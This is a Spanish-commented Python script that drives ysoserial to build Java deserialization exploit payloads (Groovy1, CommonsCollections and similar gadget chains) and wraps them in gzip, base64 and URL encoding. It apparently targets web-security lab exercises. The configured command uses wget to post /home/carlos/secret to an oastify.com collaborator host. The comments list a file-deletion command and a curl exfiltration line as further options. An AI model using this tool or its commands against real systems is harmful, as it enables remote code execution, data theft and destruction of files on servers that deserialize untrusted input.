#!/usr/bin/env python3
r"""
serialize_payload.py - Genera payloads serializados con ysoserial y les aplica
un pipeline de capas (compresion/encoding) configurable.

USO (dos formas, elegis la que quieras):

  1) SIN ARGUMENTOS (la comoda): editas las variables del bloque CONFIG de abajo
     y ejecutas:
         python serialize_payload.py
     Toma el gadget, el comando y las CAPAS directo del codigo.

  2) CON ARGUMENTOS (override opcional, no obliga a tocar el codigo):
         python serialize_payload.py -g CommonsCollections3 -c "id" --layers gzip,base64,url
     Cualquier flag que pases pisa la variable equivalente del CONFIG.

PIPELINE DE CAPAS
  Los bytes crudos que devuelve ysoserial se pasan por las capas EN ORDEN
  (izquierda -> derecha). Por defecto: gzip -> base64 -> url-encoding.
  Capas disponibles (ver --list-layers):
      gzip       comprime con gzip
      zlib       comprime con zlib (deflate + cabecera zlib)
      deflate    comprime con deflate crudo (sin cabecera zlib)
      base64     Base64 estandar
      base64url  Base64 url-safe (usa - y _ en vez de + y /)
      hex        ASCII hex (ej: 48656c6c6f)
      url        URL-encoding (percent-encoding, todo no-alfanumerico)

Detecta la version de Java automaticamente:
  - Java >= 16 : agrega los flags --add-opens/--add-exports (modulos encapsulados).
  - Java <= 15 : corre el comando simple (java -jar ysoserial-all.jar ...).
Si el modo elegido falla, reintenta con el otro (por las dudas).
"""

# ============================================================================
#                                  CONFIG
#          Edita estas variables y ejecuta sin argumentos: es todo.
# ============================================================================

# --- Gadget: la cadena de ysoserial a usar --------------------------------
# Comunes en los labs: "CommonsCollections4", "CommonsCollections3",
#                      "CommonsCollections2", "CommonsBeanutils1", "Groovy1".
# Lista completa:  java -jar ysoserial-all.jar   (sin argumentos)
GADGET = "Groovy1"

# --- Comando: lo que se ejecuta al deserializar (payload de inyeccion) -----
# Cambia SOLO esta linea para otro comando. Ejemplos:
#   "rm /home/carlos/morale.txt"
#   "wget http://TU-COLLAB.oastify.com --post-file=/home/carlos/secret"
#   "curl http://TU-COLLAB.oastify.com/$(whoami)"
COMMAND = "rm /home/carlos/secret"
COMMAND = "wget https://oldx6490lk7bglo2zwbowc4wvn1ep9dy.oastify.com --post-file=/home/carlos/secret"

# --- Pipeline de capas -----------------------------------------------------
# Arreglo de capas que se aplican a los bytes crudos, EN ORDEN.
# Agrega/quita/reordena a gusto. Ejemplos:
#   ["base64"]                        -> solo Base64 (comportamiento clasico)
#   ["gzip", "base64", "url"]         -> por defecto
#   ["gzip", "base64url"]             -> comprimido + b64 url-safe
#   ["zlib", "hex"]                   -> comprimido + hex
LAYERS = ["gzip", "base64", "url"]

# --- Toggles de salida -----------------------------------------------------
SAVE_OUTPUT_TO = ""      # ruta p/ guardar la SALIDA FINAL (tras el pipeline), "" = no
SAVE_RAW_TO    = ""      # ruta p/ guardar los bytes CRUDOS de ysoserial, "" = no

# ============================================================================
#   De aca para abajo normalmente no necesitas tocar nada.
# ============================================================================

import os
import sys
import gzip as _gzip
import zlib
import base64
import shutil
import binascii
import argparse
import subprocess
from urllib.parse import quote

JAR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ysoserial-all.jar")

# Flags necesarios en JDK modernos (>=16) para que ysoserial acceda a las clases internas.
JVM_FLAGS = [
    "--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
    "--add-opens=java.base/java.lang=ALL-UNNAMED",
    "--add-opens=java.base/java.util=ALL-UNNAMED",
    "--add-opens=java.base/java.lang.reflect=ALL-UNNAMED",
    "--add-opens=java.base/java.io=ALL-UNNAMED",
    "--add-opens=java.base/java.net=ALL-UNNAMED",
]

# ---------------------------------------------------------------------------
#  Pipeline de capas: cada transform es bytes -> bytes.
#  Las capas de "texto" (base64/hex/url) devuelven bytes ASCII para poder
#  seguir encadenando; al final se decodifican a str si son imprimibles.
# ---------------------------------------------------------------------------
LAYER_TRANSFORMS = {
    "gzip":      lambda data: _gzip.compress(data),
    "zlib":      lambda data: zlib.compress(data),
    "deflate":   lambda data: zlib.compress(data)[2:-4],   # deflate crudo (sin cabecera/checksum zlib)
    "base64":    lambda data: base64.b64encode(data),
    "base64url": lambda data: base64.urlsafe_b64encode(data),
    "hex":       lambda data: binascii.hexlify(data),
    "url":       lambda data: quote(data, safe="").encode("ascii"),
}


def apply_layers(data: bytes, layers) -> bytes:
    for name in layers:
        name = name.strip().lower()
        if not name:
            continue
        fn = LAYER_TRANSFORMS.get(name)
        if fn is None:
            sys.exit(f"[!] Capa desconocida: '{name}'. Validas: {', '.join(LAYER_TRANSFORMS)}")
        data = fn(data)
        print(f"[*] Capa '{name}' -> {len(data)} bytes", file=sys.stderr)
    return data


def java_major_version() -> int:
    """Devuelve el major de Java (8, 11, 17, 25...) o 0 si no se detecta."""
    java = shutil.which("java")
    if not java:
        sys.exit("[!] No se encontro 'java' en el PATH.")
    # 'java -version' escribe en stderr
    out = subprocess.run([java, "-version"], capture_output=True, text=True).stderr
    # formatos: "1.8.0_xx" (Java 8) o "17.0.1", "25.0.2", etc.
    for token in out.split():
        token = token.strip('"')
        if token[:1].isdigit():
            parts = token.split(".")
            if parts[0] == "1" and len(parts) > 1:      # 1.8 -> 8
                return int(parts[1])
            return int(parts[0])
    return 0


def run_ysoserial(gadget: str, command: str, use_flags: bool) -> bytes:
    cmd = ["java"]
    if use_flags:
        cmd += JVM_FLAGS
    cmd += ["-jar", JAR, gadget, command]
    proc = subprocess.run(cmd, capture_output=True)
    if proc.returncode != 0:
        raise RuntimeError(proc.stderr.decode(errors="ignore").strip())
    return proc.stdout


def generate(gadget: str, command: str) -> bytes:
    if not os.path.isfile(JAR):
        sys.exit(f"[!] No encuentro el jar: {JAR}")
    ver = java_major_version()
    prefer_flags = ver >= 16
    print(f"[*] Java detectado: v{ver} -> "
          f"{'con flags --add-opens' if prefer_flags else 'modo simple'}", file=sys.stderr)
    try:
        return run_ysoserial(gadget, command, use_flags=prefer_flags)
    except RuntimeError as e:
        first = e.args[0].splitlines()[0] if e.args and e.args[0] else str(e)
        print(f"[!] Fallo el modo principal, reintento con el alternativo...\n    {first}",
              file=sys.stderr)
        return run_ysoserial(gadget, command, use_flags=not prefer_flags)


def main():
    ap = argparse.ArgumentParser(
        description="Genera un payload serializado con ysoserial y le aplica un pipeline de capas.")
    ap.add_argument("-g", "--gadget", default=GADGET, help=f"Gadget (def: {GADGET})")
    ap.add_argument("-c", "--command", default=COMMAND, help=f"Comando (def: {COMMAND})")
    ap.add_argument("-l", "--layers", default=None,
                    help="Capas separadas por coma, en orden (ej: gzip,base64,url). "
                         f"Def: {','.join(LAYERS)}")
    ap.add_argument("--list-layers", action="store_true", help="Lista las capas disponibles y sale")
    ap.add_argument("--raw", metavar="FILE", help="Guardar los bytes CRUDOS de ysoserial en FILE")
    ap.add_argument("-o", "--out", metavar="FILE", help="Guardar la SALIDA FINAL en FILE")
    args = ap.parse_args()

    if args.list_layers:
        print("Capas disponibles (encadenables en orden):")
        for k in LAYER_TRANSFORMS:
            print(f"  {k}")
        return

    # Los flags CLI (si se pasan) pisan las variables del CONFIG.
    layers   = [x for x in args.layers.split(",")] if args.layers else LAYERS
    raw_path = args.raw or (SAVE_RAW_TO or None)
    out_path = args.out or (SAVE_OUTPUT_TO or None)

    print(f"[*] Gadget : {args.gadget}", file=sys.stderr)
    print(f"[*] Comando: {args.command}", file=sys.stderr)
    print(f"[*] Capas  : {' -> '.join(layers) if layers else '(ninguna, bytes crudos)'}", file=sys.stderr)

    raw = generate(args.gadget, args.command)
    print(f"[*] ysoserial -> {len(raw)} bytes crudos", file=sys.stderr)

    if raw_path:
        with open(raw_path, "wb") as fh:
            fh.write(raw)
        print(f"[*] Bytes crudos -> {raw_path} ({len(raw)} bytes)", file=sys.stderr)

    out = apply_layers(raw, layers)

    if out_path:
        with open(out_path, "wb") as fh:
            fh.write(out)
        print(f"[*] Salida final -> {out_path} ({len(out)} bytes)", file=sys.stderr)

    # stdout limpio: la salida final. Si es texto imprimible -> str; si es binario -> aviso.
    try:
        sys.stdout.write(out.decode("ascii"))
        sys.stdout.write("\n")
    except UnicodeDecodeError:
        print("[!] La salida final es BINARIA (no hay capa de encoding al final).", file=sys.stderr)
        print("    Agrega base64/base64url/hex/url al final, o usa -o para guardarla en archivo.",
              file=sys.stderr)
        sys.stdout.buffer.write(out)


if __name__ == "__main__":
    main()
